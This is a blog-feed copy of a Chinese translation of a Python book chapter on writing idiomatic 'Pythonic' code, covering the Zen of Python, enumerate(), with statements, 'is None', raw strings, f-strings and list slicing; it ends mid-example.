    <content type="html"><![CDATA[<h1 id="第-6-章-编写Python风格的代码"><a href="#第-6-章-编写Python风格的代码" class="headerlink" title="第 6 章　编写Python风格的代码"></a>第 6 章　编写Python风格的代码</h1><blockquote><p>对于编程语言来说，“强大”是一个毫无意义的形容词。每一种编程语言都称自己是强大的。官方的Python教程一开始就说“Python是一种易于学习、功能强大的编程语言”，但没有哪种算法只能用某种特定的语言编写，也没有哪种衡量单位来量化某种编程语言的“厉害程度”（尽管可以衡量程序员为他们最喜欢的编程语言争取地位的声音大小）。</p></blockquote><p>　　每种语言都有自己的设计模式和缺陷，它们构成了语言的优势和劣势。要想像一个真正的Python大师一样编写代码，你需要懂的不仅仅是语法和标准库，还要学习它的习惯用法，或Python特定的编程方法。Python语言的某些特性有助于编写Python风格的代码。</p><p>　　在本章中，我将提供几种编写Python风格代码的方法，以及与之对应的非Python风格的写法。对Python风格的理解可能因人而异，但通常包括本章所呈现的示例和实践。有经验的程序员都会使用这些技术，熟悉这些技术可以让你一眼看懂实际的工程代码。</p><h2 id="6-1-Python之禅"><a href="#6-1-Python之禅" class="headerlink" title="6.1　Python之禅"></a>6.1　Python之禅</h2><p>　　Tim Peters的“Python之禅”汇集了Python语言设计和Python编程的20条准则。你的Python代码不一定必须遵循这些准则，但它们不无裨益。“Python之禅”也是一个复活节彩蛋，或者说是隐藏的笑话，当运行<code>import this</code>时就会出现。</p><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs fortran">&gt;&gt;&gt; <span class="hljs-keyword">import</span> this<br>The Zen of Python, by Tim Peters<br><br>Beautiful is better than ugly.<br>Explicit is better than <span class="hljs-keyword">implicit</span>.<br>--snip--<br></code></pre></td></tr></table></figure><blockquote><p><strong>注意</strong>　神奇的是，实际上只有19条准则写了出来。据Python之父Guido van Rossum所说，缺失的第20条箴言是Tim Peters的搞怪的行内笑话，Tim留出地方让Guido来写，但看起来他一直没做到。</p></blockquote><p>　　总体来说，这些准则是程序员可以支持或者反对的观点。就像一些优秀的道德准则一样，它们在一定程度上有些自相矛盾，但能提供更大的灵活性。以下是我对这些箴言的解释。</p><blockquote><p>　　　　<strong>美丽胜于丑陋。</strong>美丽的代码指易于阅读和理解的代码。程序员经常快速编写代码，不考虑可读性。虽然计算机会运行可读性不强的代码，但这样的代码对于程序员而言不容易维护和调试。虽然美是主观的，但不考虑可读性的代码在别人看来往往是丑陋的。Python之所以受欢迎，是因为它的语法不像其他语言那样充斥着神秘的标点符号，Python很容易编写。</p><p>　　　　<strong>明确胜于隐含。</strong>如果我给这条箴言的解释是“这是不言而喻的”，那它就是一个糟糕的解释。代码应该是详细明确的，应避免把代码的功能隐匿在晦涩的、且需要对语言非常熟悉才能理解的语言特性中。</p><p>　　　　<strong>简单胜于复杂。复杂胜于更复杂。</strong>这两句箴言告诉我们，任何东西都既可以用简单的技术建造，也可以用复杂的技术建造。如果你有一个小问题用铲子就可以解决，使用50吨级的液压推土机就有些大材小用。但如果是个大工程，那么操作一台推土机比协调100名铲运工要简单得多。所以，要选择简单而非复杂，但也要知道简单方案的局限性。</p><p>　　　　<strong>扁平胜于嵌套。</strong>程序员喜欢将代码按照类别进行组织，特别是类别又包含子类别，而子类别又包含更细的子类别。这些层级结构往往并不会增强代码的组织性，而是增强了官僚性。只在一个顶层模块或者数据结构中编写代码并无不妥。如果你的代码看起来像<code>spam.eggs.bacon.ham()</code>或<code>spam[&#39;eggs&#39;][&#39;bacon&#39;][&#39;ham&#39;]</code>，那它就太过复杂了。</p><p>　　　　<strong>稀疏胜于密集。</strong>程序员经常喜欢把尽可能多的功能塞进尽可能少的代码中，就像下面这一行：<code>print(&#39;\n&#39;.join(&quot;%i bytes = %i bits which has %i possiblevalues.&quot; % (j, j*8, 256**j-1) for j in (1 &lt;&lt; i for i in range(8))))</code>。尽管这样的代码可以给朋友留下深刻印象，但会惹怒同事，因为他们得费尽心思理解这段代码。不要让代码一次做太多的事情。分散在多行的代码往往比密集的单行代码更容易阅读。这句箴言与“简单胜于复杂”类似。</p><p>　　​<strong>可读性很重要。</strong>尽管对于那些从1970年就开始用C语言编程的人而言，<code>strcmp()</code>显而易见指的是“string compare”（字符串比较）函数，但现代计算机的内存足以让你编写完整的函数名称。不要从完整的名称中删除某些字母或者写过分简洁的代码。花点时间为变量和函数想出具有描述性且具体的名称。代码各个部分之间的空行与书中起分隔作用的段落一样，可以让读者知道哪些部分应该放在一起阅读。这句箴言与“美丽胜于丑陋”类似。</p><p>　　　　<strong>特殊情况并没有特殊到打破规则的地步。不过，实用性胜于纯粹性。</strong>这两句箴言看起来相互矛盾。在编程过程中，有很多“最佳实践”值得程序员努力践行。一方面，绕过这些实践，快速实现需求的想法也许很诱人，但可能会导致一堆不一致、不可读的代码烂摊子。另一方面，妥协遵守一些规则可能会导致高度抽象、不可读的代码。比如，Java试图让所有代码都符合面向对象的范式，这往往会导致即使很小的程序也有很多模板代码。随着经验不断积累，你在这两条箴言之间取舍将会变得越来越容易。时间长了，你不仅可以学会遵循规则，而且将学会何时打破规则。</p><p>　　　　<strong>除非必要，否则错误不该被悄无声息地忽略。</strong>程序员经常忽略错误信息，但这并不意味着程序也是这样。当函数返回错误代码或<code>None</code>而不是提示异常时，“无声的错误”就会发生。这条箴言的意思是，程序快速失败和崩溃要比不提示错误并继续运行好。后来发生的不可避免的错误将更加难以调试，因为它们是在出现源头问题之后很久才被发现的。尽管你随时可以忽略程序引起的错误，但要确保这样做有充足的理由。</p><p>　　　　<strong>面对模棱两可的问题，不要猜测。</strong>计算机使人类变得迷信，有句话是“重启计算机，包治百病”。但计算机没有神奇的魔法。代码未能正常执行是有明确原因的，只有通过仔细、批判性的思考才能解决问题。拒绝通过盲目尝试来解决问题，这样做往往只会掩盖问题，而不能真正解决问题。</p><p>　　　　<strong>应该有一个，最好只有一个明显的方法能使用。</strong>这是对Perl编程语言的座右铭“有不止一种方法能用”的抨击。事实证明，有三四种方法完成同样的任务是一把双刃剑：坏处是为了能读懂其他人写的代码，你不得不学会所有可能的写法；好处是在编写代码时，你可以灵活地使用多种写法。不过，这种灵活性是得不偿失的，最好只有一个明显的方法能使用。</p><p>　　　　<strong>除非你是荷兰人，否则这种方法可能并不那么显而易见。</strong>这是一句玩笑话。Python的创造者Guido van Rossum是荷兰人。<strong>1</strong></p><p>　　　<strong>有总比没有好。然而不经思考就做还不如不做。****2</strong>这两句箴言是说，运行速度慢的代码显然比不上运行速度快的代码。但是，多等待程序运行一会儿总比程序尽快运行完却发现结果是错的要好。</p><p>　　　　<strong>如果实现很难解释，它就是个坏主意；如果实现很容易解释，这可能是一个好主意。</strong>许多事情随着时间的推移变得越来越复杂，比如税法、恋爱关系、Python编程书。软件也不例外。这句箴言提醒我们，如果代码复杂到让专业人员无法理解和调试的程度，那就是坏代码。但是，很容易被解释的代码也不一定就是好代码。遗憾的是，写出尽可能简单的代码并非易事。</p><p>　　　　<strong>命名空间是一个很棒的主意，可以多用。</strong>命名空间是标识符的独立容器，用来防止命名冲突。例如，内置函数<code>open()</code>和<code>webbrowser.open()</code>函数有相同的名字，但对应不同的函数。导入<code>webbrowser</code>不会覆盖内置的<code>open()</code>函数，因为这两个<code>open()</code>函数存在于不同的命名空间，分别是内置命名空间和<code>webbrowser</code>模块的命名空间。但要记住，扁平胜于嵌套。尽管命名空间确实很好，但你应该只为防止命名冲突而使用命名空间，而不是添加不必要的分</p></blockquote><h2 id="6-2-学着喜欢强制缩进"><a href="#6-2-学着喜欢强制缩进" class="headerlink" title="6.2　学着喜欢强制缩进"></a>6.2　学着喜欢强制缩进</h2><h2 id="6-3-使用timeit模块衡量性能"><a href="#6-3-使用timeit模块衡量性能" class="headerlink" title="6.3　使用timeit模块衡量性能"></a>6.3　使用<code>timeit</code>模块衡量性能</h2><h2 id="6-4-常被误用的语法"><a href="#6-4-常被误用的语法" class="headerlink" title="6.4　常被误用的语法"></a>6.4　常被误用的语法</h2><p>　　如果Python不是你的第一门编程语言，那么你可能会用其他编程语言的代码编写策略来写Python代码。或者因为不知道有更多既定的最佳实践，你学了一种并不常见的Python编写方式。这种不优雅的代码也能用，但你可以学习更多编写Python代码的标准方法以节省时间和精力。本节讲述了程序员常见的错误，以及该如何编写代码。</p><h3 id="6-4-1-使用enumerate-而不是range"><a href="#6-4-1-使用enumerate-而不是range" class="headerlink" title="6.4.1　使用enumerate()而不是range()"></a>6.4.1　使用<code>enumerate()</code>而不是<code>range()</code></h3><p>　　当在一个列表或者其他序列上循环时，一些程序员使用<code>range()</code>函数和<code>len()</code>函数生成从0到序列长度−1的索引整数。在这些<code>for</code>循环中通常使用变量<code>i</code>（代表index）。例如在交互式shell中输入下面这个不符合Python风格的示例：</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">animals = [<span class="hljs-string">&#x27;cat&#x27;</span>, <span class="hljs-string">&#x27;dog&#x27;</span>, <span class="hljs-string">&#x27;moose&#x27;</span>]</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(animals)):</span><br><span class="hljs-meta prompt_">...</span> <span class="language-python">    <span class="hljs-built_in">print</span>(i, animals[i])</span><br><span class="hljs-meta prompt_">...</span><br>0 cat<br>1 dog<br>2 moose<br></code></pre></td></tr></table></figure><p><code>range(len())</code>的传统写法比较直接，但不够理想，因为它的可读性不好。更好的做法是将列表或者序列传递给内置的<code>enumerate()</code>函数，它将返回索引的整数值和当前索引对应的项。比如，可以编写下面这种Python风格的代码：</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-comment"># Python风格的示例</span></span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">animals = [<span class="hljs-string">&#x27;cat&#x27;</span>, <span class="hljs-string">&#x27;dog&#x27;</span>, <span class="hljs-string">&#x27;moose&#x27;</span>]</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-keyword">for</span> i, animal <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(animals):</span><br><span class="hljs-meta prompt_">...</span> <span class="language-python">    <span class="hljs-built_in">print</span>(i, animal)</span><br><span class="hljs-meta prompt_">...</span><br>0 cat<br>1 dog<br>2 moos<br></code></pre></td></tr></table></figure><p>使用<code>enumerate()</code>替代<code>range(len())</code>可以让你的代码整洁一点。如果你只需要列表中的项而不需要索引，可以用下面这种Python风格的方式迭代列表：</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-comment"># Python风格的示例</span></span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">animals = [<span class="hljs-string">&#x27;cat&#x27;</span>, <span class="hljs-string">&#x27;dog&#x27;</span>, <span class="hljs-string">&#x27;moose&#x27;</span>]</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-keyword">for</span> animal <span class="hljs-keyword">in</span> animals:</span><br><span class="hljs-meta prompt_">...</span> <span class="language-python">    <span class="hljs-built_in">print</span>(animal)</span><br><span class="hljs-meta prompt_">...</span><br>cat<br>dog<br>moose<br></code></pre></td></tr></table></figure><p>调用<code>enumerate()</code>并直接在一个序列上进行迭代要比使用传统的<code>range(len())</code>方式好。</p><h3 id="6-4-2-使用with语句代替open-和close"><a href="#6-4-2-使用with语句代替open-和close" class="headerlink" title="6.4.2　使用with语句代替open()和close()"></a>6.4.2　使用<code>with</code>语句代替<code>open()</code>和<code>close()</code></h3><p>　　<code>open()</code>函数将返回一个文件对象，该对象包含读取和写入文件的方法。当操作完成后需要调用<code>close()</code>方法释放文件，以便其他程序读取和写入。你可以单独使用这些函数，但这样做不符合Python风格。比如，将文本“Hello, world!”写入一个名为spam.txt的文件中：</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-comment"># 不符合Python风格的示例</span></span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">fileObj = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;spam.txt&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>)</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">fileObj.write(<span class="hljs-string">&#x27;Hello, world!&#x27;</span>)</span><br>13<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">fileObj.close()</span><br></code></pre></td></tr></table></figure><p>这样编写代码可能会导致文件未被关闭，比如下面这个示例，如果<code>try</code>块中出现了异常，程序就会跳过<code>close()</code>调用：</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-comment"># 不符合Python风格的示例</span></span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-keyword">try</span>:</span><br><span class="hljs-meta prompt_">...</span> <span class="language-python">    fileObj = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;spam.txt&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>)</span><br><span class="hljs-meta prompt_">...</span> <span class="language-python">    eggs = <span class="hljs-number">42</span> / <span class="hljs-number">0</span>    <span class="hljs-comment"># 这里会产生以0为除数的错误</span></span><br><span class="hljs-meta prompt_">...</span> <span class="language-python">    fileObj.close()  <span class="hljs-comment"># 这一行永远不会被执行</span></span><br><span class="hljs-meta prompt_">...</span> <span class="language-python"><span class="hljs-keyword">except</span>:</span><br><span class="hljs-meta prompt_">...</span> <span class="language-python">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Some error occurred.&#x27;</span>)</span><br>Some error occurred.<br></code></pre></td></tr></table></figure><p>在遇到以0为除数的错误时，程序会转移到<code>except</code>块执行，跳过了<code>close()</code>调用，且文件一直保持打开状态。这可能会导致文件出现损坏，而这个错误很难被追溯到<code>try</code>块上。更好的做法是使用<code>with</code>语句，它可以在执行顺序离开<code>with</code>语句块时自动调用<code>close()</code>。下面的Python风格的示例和本节第一个示例有相同的作用：</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-comment"># Python风格的示例</span></span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;spam.txt&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> fileObj:</span><br><span class="hljs-meta prompt_">...</span> <span class="language-python">    fileObj.write(<span class="hljs-string">&#x27;Hello, world!&#x27;</span>)</span><br><span class="hljs-meta prompt_">...</span><br></code></pre></td></tr></table></figure><p>尽管没有明确地调用<code>close()</code>，但当执行顺序离开这个块的时候，<code>with</code>语句会自动调用它。</p><h3 id="6-4-3-用is跟None做比较而不用"><a href="#6-4-3-用is跟None做比较而不用" class="headerlink" title="6.4.3　用is跟None做比较而不用=="></a>6.4.3　用<code>is</code>跟<code>None</code>做比较而不用<code>==</code></h3><p>　　<code>==</code>相等运算符是比较两个对象的值，而<code>is</code>身份运算符是比较两个对象的身份。第7章将解释值和身份的区别。两个对象可以存储相同的值，但它们是两个独立的对象，拥有不同的身份。将某个值跟<code>None</code>比较时，绝大多数情况下应使用<code>is</code>，而非<code>==</code>。</p><p>　　在特殊情况下，如果使用了<strong>运算符重载</strong>，即使<code>spam</code>指向<code>None</code>，表达式<code>spam == None</code>也会等于<code>True</code>。<code>spam is None</code>将检查<code>spam</code>变量中的值是否真的是<code>None</code>，由于<code>None</code>是<code>NoneType</code>数据类型唯一的值，因此在任何Python程序中只有一个<code>None</code>对象。当变量指向<code>None</code>时，<code>is None</code>比较表达式总是为<code>True</code>。第17章将描述<code>==</code>运算符重载的具体细节，可先看看这个示例：</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">SomeClass</span>:</span><br><span class="hljs-meta prompt_">...</span> <span class="language-python">    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__eq__</span>(<span class="hljs-params">self, other</span>):</span><br><span class="hljs-meta prompt_">...</span> <span class="language-python">        <span class="hljs-keyword">if</span> other <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:</span><br><span class="hljs-meta prompt_">...</span> <span class="language-python">            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span></span><br><span class="hljs-meta prompt_">...</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">spam = SomeClass()</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">spam == <span class="hljs-literal">None</span></span><br>True<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">spam <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span></span><br>False<br></code></pre></td></tr></table></figure><p>很少会以这种方式重载<code>==</code>运算符，但为了以防万一，推荐一直使用<code>is None</code>而非<code>== None</code>，这是Python的惯用写法。</p><p>　　而且，不应该在值为<code>True</code>和<code>False</code>的情况下使用<code>is</code>运算符。可以使用<code>==</code>相等运算符将值与<code>True</code>或者<code>False</code>比较，比如<code>spam == True</code>或者<code>spam == False</code>。更常见的是根本不使用运算符和布尔值，把代码写成<code>if spam:</code>或者<code>if not spam:</code>，而不是<code>if spam == True</code>或<code>if spam == False</code>。</p><h2 id="6-5-格式化字符串"><a href="#6-5-格式化字符串" class="headerlink" title="6.5　格式化字符串"></a>6.5　格式化字符串</h2><p>　　几乎每个使用不同编程语言编写的计算机程序中都有字符串。这种数据类型很常见，所以Python中有许多操作和格式化字符串的方法。本节将重点介绍一些最佳实践。</p><h3 id="6-5-1-如果字符串有很多反斜杠，请使用原始字符串"><a href="#6-5-1-如果字符串有很多反斜杠，请使用原始字符串" class="headerlink" title="6.5.1　如果字符串有很多反斜杠，请使用原始字符串"></a>6.5.1　如果字符串有很多反斜杠，请使用原始字符串</h3><p>　　转义字符允许你在字符串字面量中插入原本不能包含的文本。例如在<code>&#39;Zophie\&#39;s chair&#39;</code>中，需要反斜杠<code>\</code>，这样会使第二个单引号成为字符串的一部分，而不是表示字符串到此结束。因为反斜杠具有这种特殊的转义作用，所以如果真的想在字符串中放入一个反斜杠字符，那么必须以<code>\\</code>的形式输入。</p><p>　　<strong>原始字符串</strong>是具有<code>r</code>前缀的字符串字面量，它们不把反斜杠视为转义字符，而是作为普通字符。比如下面这个Windows文件路径的字符串需要多个转义的反斜杠，这和Python风格不同：</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-comment"># 不符合Python风格的示例</span></span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;The file is in C:\\Users\\Al\\Desktop\\Info\\Archive\\Spam&#x27;</span>)</span><br>The file is in C:\Users\Al\Desktop\Info\Archive\Spam<br></code></pre></td></tr></table></figure><p>而下面这个原始字符串（注意带有<code>r</code>前缀）提供相同的字符串值，它的可读性更好：</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-comment"># Python风格的示例</span></span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">print</span>(<span class="hljs-string">r&#x27;The file is in C:\Users\Al\Desktop\Info\Archive\Spam&#x27;</span>)</span><br>The file is in C:\Users\Al\Desktop\Info\Archive\Spam<br></code></pre></td></tr></table></figure><p>　　原始字符串并不是一种不同的字符串数据类型，它只是用来输入包含多个反斜杠字符的字符串字面量的便捷方式。它常用来输入正则表达式或者Windows文件路径的字符串。这些字符串中经常有多个反斜杠字符，如果逐个使用<code>\\</code>转义会费时费力。</p><h3 id="6-5-2-使用f-string格式化字符串"><a href="#6-5-2-使用f-string格式化字符串" class="headerlink" title="6.5.2　使用f-string格式化字符串"></a>6.5.2　使用f-string格式化字符串</h3><p>　　<strong>字符串格式化</strong>，也被称为<strong>字符串插值</strong>，用来创建嵌套其他字符串的字符串，此方法的发展历史很长。<strong>3</strong>最初是使用<code>+</code>运算符将字符串连接在一起，但这导致代码中出现很多引号和加号，比如<code>&#39;Hello, &#39; + name + &#39;. Today is &#39; + day + &#39; and it is &#39; + weather + &#39;.&#39;</code>，而<code>%s</code>转换格式符的出现则简化了语法：<code>&#39;Hello, %s. Today is %s and it is %s.&#39; % (name, day, weather)</code>。这两种方法都将<code>name</code>、<code>day</code>和<code>weather</code>变量中的字符串插入到字符串字面量中以得到一个新的字符串值，比如<code>&#39;Hello, Al. Today is Sunday and it is sunny.&#39;</code>。</p><p><strong>3</strong>伴随着Python的发展，Python提出了多种字符串格式化方法。——译者注</p><p><code>format()</code>字符串方法添加了格式规范迷你语言，它使用<code>&#123;&#125;</code>括号对，与<code>%s</code>转换格式符使用方式类似。不过这个方法有些复杂，可能会产生不可读的代码，所以我不推荐使用它。</p><p>　　从Python 3.6开始，<strong>f-string</strong>（format string的缩写）提供了一种更方便的方法来创建嵌套其他字符串的字符串。类似于原始字符串会在第一个引号前使用前缀<code>r</code>，f-string使用前缀<code>f</code>。可以在f-string的大括号中加入变量名称，以插入存储在这些变量中的字符串：</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">name, day, weather = <span class="hljs-string">&#x27;Al&#x27;</span>, <span class="hljs-string">&#x27;Sunday&#x27;</span>, <span class="hljs-string">&#x27;sunny&#x27;</span></span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-string">f&#x27;Hello, <span class="hljs-subst">&#123;name&#125;</span>. Today is <span class="hljs-subst">&#123;day&#125;</span> and it is <span class="hljs-subst">&#123;weather&#125;</span>.&#x27;</span></span><br>&#x27;Hello, Al. Today is Sunday and it is sunny.&#x27;<br></code></pre></td></tr></table></figure><p>大括号中也可以包含完整的表达式：</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs maxima">&gt;&gt;&gt; <span class="hljs-built_in">width</span>, <span class="hljs-built_in">length</span> = <span class="hljs-number">10</span>, <span class="hljs-number">12</span><br>&gt;&gt;&gt; f&#x27;A &#123;<span class="hljs-built_in">width</span>&#125; by &#123;<span class="hljs-built_in">length</span>&#125; <span class="hljs-built_in">room</span> has an area of &#123;<span class="hljs-built_in">width</span> * <span class="hljs-built_in">length</span>&#125;.&#x27;<br>&#x27;A <span class="hljs-number">10</span> by <span class="hljs-number">12</span> <span class="hljs-built_in">room</span> has an area of <span class="hljs-number">120</span>.&#x27;<br></code></pre></td></tr></table></figure><p>　　如果要在f-string中包含大括号字符，可以使用额外的括号来转义它：</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">spam = <span class="hljs-number">42</span></span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-string">f&#x27;This prints the value in spam: <span class="hljs-subst">&#123;spam&#125;</span>&#x27;</span></span><br>&#x27;This prints the value in spam: 42&#x27;<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-string">f&#x27;This prints literal curly braces: &#123;&#123;spam&#125;&#125;&#x27;</span></span><br>&#x27;This prints literal curly braces: &#123;spam&#125;&#x27;<br></code></pre></td></tr></table></figure><p>　　由于可以把变量名和表达式直接写在字符串内，因此代码的可读性比旧的字符串格式化方法强。</p><p>　　格式化字符串有这么多方法，这似乎违背了“Python之禅”的箴言：“应该有一个，最好只有一个明显的方法能使用。”但在我看来，f-string是对语言的一种改进，而且正如另一条准则所说，“实用性胜于纯粹性”，所以它无可厚非。如果你只用Python 3.6或者更高版本编写代码，请使用f-string。如果你写的代码是由早期的Python版本运行，那就继续用<code>format()</code>方法或者<code>%s</code>转换格式符。</p><h2 id="6-6-制作列表的浅副本"><a href="#6-6-制作列表的浅副本" class="headerlink" title="6.6　制作列表的浅副本"></a>6.6　制作列表的浅副本</h2><p>　　使用<code>slice</code>语法可以很容易地基于现有的字符串或者列表创建新的字符串或列表。在交互式shell中输入以下内容看一下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&#x27;Hello, world!&#x27;</span>[<span class="hljs-number">7</span>:<span class="hljs-number">12</span>] <span class="hljs-comment"># 基于长字符串创建短字符串</span><br><span class="hljs-string">&#x27;world&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&#x27;Hello, world!&#x27;</span>[:<span class="hljs-number">5</span>] <span class="hljs-comment"># 基于长字符串创建短字符串</span><br><span class="hljs-string">&#x27;Hello&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>[<span class="hljs-string">&#x27;cat&#x27;</span>, <span class="hljs-string">&#x27;dog&#x27;</span>, <span class="hljs-string">&#x27;rat&#x27;</span>, <span class="hljs-string">&#x27;eel&#x27;</span>][<span class="hljs-number">2</span>:] <span class="hljs-comment"># 基于长列表创建短列表</span><br>[<span class="hljs-string">&#x27;rat&#x27;</span>, <span class="hljs-string">&#x27;eel&#x27;</span>]<br></code></pre></td></tr></table></figure><p>要使用冒号对开始索引位置和结束索引位置进行分隔，以使内容从旧列表复制到新列表中。当省略冒号前的起始索引时，比如<code>&#39;Hello, world!&#39;[:5]</code>，起始索引默认为0。同理，当省略冒号后的结束索引时，比如<code>[&#39;cat&#39;,&#39;dog&#39;,&#39;rat&#39;,&#39;eel&#39;][2:]</code>，结束索引默认为列表结尾。</p><p>　　如果两个索引都被省略，起始索引是0（列表开头），结束索引是列表结尾，这实际上会创建一个列表的副本。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>spam = [<span class="hljs-string">&#x27;cat&#x27;</span>, <span class="hljs-string">&#x27;dog&#x27;</span>, <span class="hljs-string">&#x27;rat&#x27;</span>, <span class="hljs-string">&#x27;eel&#x27;</span>]<br><span class="hljs-meta">&gt;&gt;&gt; </span>eggs = spam[:]<br><span class="hljs-meta">&gt;&gt;&gt; </span>eggs<br>[<span class="hljs-string">&#x27;cat&#x27;</span>, <span class="hljs-string">&#x27;dog&#x27;</span>, <span class="hljs-string">&#x27;rat&#x27;</span>, <span class="hljs-string">&#x27;eel&#x27;</span>]<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">id</span>(spam) == <span class="hljs-built_in">id</span>(eggs)<br><span 